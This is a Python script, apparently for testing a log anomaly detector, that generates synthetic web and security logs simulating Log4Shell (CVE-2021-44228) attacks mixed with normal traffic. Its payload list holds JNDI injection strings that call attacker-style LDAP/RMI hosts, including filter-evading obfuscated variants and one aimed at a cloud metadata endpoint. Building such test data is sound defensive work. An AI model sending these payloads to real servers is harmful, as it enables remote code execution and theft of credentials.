#!/usr/bin/env python3
"""
生成 Log4Shell (CVE-2021-44228) 攻击测试数据集
"""

import random
import datetime
from datetime import datetime, timedelta

def generate_log4j_attacks():
    """生成 Log4Shell 攻击日志"""
    logs = []
    base_time = datetime(2024, 12, 20, 10, 0, 0)

    # Log4Shell JNDI 注入 payloads
    log4j_payloads = [
        "${jndi:ldap://192.168.1.100:1389/Exploit}",
        "${jndi:ldap://evil.com/Exploit}",
        "${jndi:rmi://attacker.com/CallBack}",
        "${jndi:ldap://10.0.0.5:389/o=tomcat}",
        "${jndi:dns://dns.log4shell.attacker.com}",
        "${jndi:ldap://192.168.1.50:1389/Base64/Base64/Base64}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://...",
        "${jndi:ldap://169.254.169.254/latest/meta-data}",
        "${jndi:rmi://127.0.0.1:1099/Object}",
        "${jndi:ldap://attacker.com/a}",
        "${jndi:ldap://45.154.255.147:1389/o=Reference}",
        "${jndi:ldap://185.220.101.46:389/Payload}",
        "${jndi:rmi://198.51.100.50/Exploit}",
        "${lower:l${lower:d${lower:a${lower:p}}}:${lower:r${lower:m${lower:i}}}://...",
    ]

    # 正常业务日志
    normal_apis = [
        "/api/users",
        "/api/products",
        "/api/login",
        "/api/health",
        "/static/main.js",
        "/static/style.css",
    ]

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0",
    ]

    # 生成 200 条日志：80% 正常，20% Log4Shell 攻击
    for i in range(200):
        timestamp = base_time + timedelta(seconds=i * 30)
        is_attack = random.random() < 0.2

        if is_attack:
            payload = random.choice(log4j_payloads)
            src_ip = random.choice([
                "45.154.255.147", "185.220.101.46", "91.121.87.18",
                "103.35.74.12", "23.129.64.213", "198.51.100.50"
            ])
            api = random.choice(["/api/search", "/api/user", "/login", "/admin"])
            user_agent = random.choice(user_agents)

            # 攻击请求
            log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {src_ip} - - "GET {api}?q={payload} HTTP/1.1" 200 {random.randint(100, 500)} "{user_agent}"'
            logs.append(log)

            # 某些情况下应用会记录 JNDI lookup
            if random.random() < 0.3:
                log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} catalina.out: JNDI lookup for [{payload}] was bound to Reference'
                logs.append(log2)

            # 漏洞利用成功时的响应日志
            if random.random() < 0.1:
                log3 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} catalina.out: Loaded remote class: com.sun.jndi.ldap.LdapCtx'
                logs.append(log3)
        else:
            src_ip = random.choice(["192.168.1.100", "192.168.1.101", "10.0.0.50"])
            api = random.choice(normal_apis)
            user_agent = random.choice(user_agents)
            log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {src_ip} - - "GET {api} HTTP/1.1" 200 {random.randint(50, 500)} "{user_agent}"'
            logs.append(log)

    return logs

def generate_log4j_system_logs():
    """生成系统日志中的 Log4Shell 相关事件"""
    logs = []
    base_time = datetime(2024, 12, 20, 10, 0, 0)

    # 检测到 JNDI 注入的告警
    for i in range(30):
        timestamp = base_time + timedelta(minutes=i * 5)
        src_ip = random.choice([
            "45.154.255.147", "185.220.101.46", "91.121.87.18",
            "103.35.74.12", "23.129.64.213"
        ])

        # WAF/防火墙检测
        log = f'{timestamp.strftime("%b %d %H:%M:%S")} firewall: BLOCK [CVE-2021-44228] JNDI injection from {src_ip}:{random.randint(10000, 60000)} payload=${{jndi:ldap://...}}'
        logs.append(log)

        # IDS/IPS 告警
        log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected'
        logs.append(log2)

    # 漏洞扫描
    for i in range(50):
        timestamp = base_time + timedelta(seconds=i * 60)
        src_ip = random.choice([
            "45.154.255.147", "185.220.101.46", "91.121.87.18",
            "103.35.74.12", "23.129.64.213", "198.51.100.50"
        ])

        # 漏洞扫描日志
        log = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} {src_ip} - - "GET /?user=${{jndi:ldap://attacker.com/a}} HTTP/1.1" 403 -'
        logs.append(log)

        # 日志中的 JNDI 尝试
        if i % 3 == 0:
            log2 = f'{timestamp.strftime("%Y-%m-%d %H:%M:%S")} app[error]: Exception thrown processing ${{jndi:ldap://...}}'
            logs.append(log2)

    return logs

def main():
    print("生成 Log4Shell (CVE-2021-44228) 测试数据集...")

    all_logs = []

    print("  - 攻击请求日志...")
    all_logs.extend(generate_log4j_attacks())

    print("  - 系统安全日志...")
    all_logs.extend(generate_log4j_system_logs())

    # 随机打乱
    random.shuffle(all_logs)

    header = """# ============================================================
# Log4Shell (CVE-2021-44228) 攻击测试数据集
# 生成时间: 2024-12-20
# 包含: JNDI注入、LDAP/RMI协议利用、WAF阻断、IDS告警
# ============================================================
"""

    output_file = "D:/PycharmProjects/deeplog/logs/log4shell_dataset.log"
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(header)
        f.write('\n'.join(filter(None, all_logs)))
        f.write('\n')

    print(f"\n完成！共生成 {len(all_logs)} 条日志")
    print(f"保存至: {output_file}")

if __name__ == "__main__":
    main()
